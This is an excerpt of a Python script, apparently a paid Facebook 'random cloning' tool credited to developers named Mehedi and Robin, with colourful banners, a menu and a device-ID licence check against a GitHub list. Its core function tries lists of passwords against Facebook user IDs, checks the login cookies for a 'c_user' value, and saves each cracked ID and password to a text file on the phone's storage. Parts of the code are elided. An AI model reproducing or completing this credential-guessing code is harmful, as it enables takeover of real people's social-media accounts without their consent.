...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; MAHEDI X ROBIN \x07')
...
\x1b[38;5;46m______________________________________________________
 \033[1;31m[\033[1;32m[A]\033[1;31m]\033[1;32m DEVELOPER : MEHEDI
 \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : ROBIN
 \033[1;31m[\033[1;32m[A]\033[1;31m]\033[1;32m FACEBOOK  : RO B IN 
 \033[1;31m[\033[1;32m[F]\033[1;31m]\033[1;32m GITHUB    : ROBIN6T9
 \033[1;31m[\033[1;32m[A]\033[1;31m]\033[1;32m TOOLS     : PAID
 \033[1;31m[\033[1;32m[T]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V-1]
...
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;37m1]\33[1;92mSTART RANDOM CLONING")
	print("[\033[1;37m2]\33[1;92mCONTACT ADMIN & FB GROUP")
	print("[\033[1;37m3]\33[1;92mFOLLOW MY FB PROFILE")
	print("[\033[1;37m4]\33[1;92mJOIN MESSENGER GROUP")
	print('[\033[1;37m0]\33[1;92mEXIT PROGRAMMING')
	print(54*'━')
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/robinislam660');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801576779325');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[ROBIN]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [ROBIN-OK] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/ROBIN-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/ROBIN-6T9/Ff-tools/blob/main/ff_tools.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/robinislam660")
        time.sleep(3.0)
        ...
        os.system("xdg-open https://wa.me/+8801576779325")
        superuser()        
superuser()
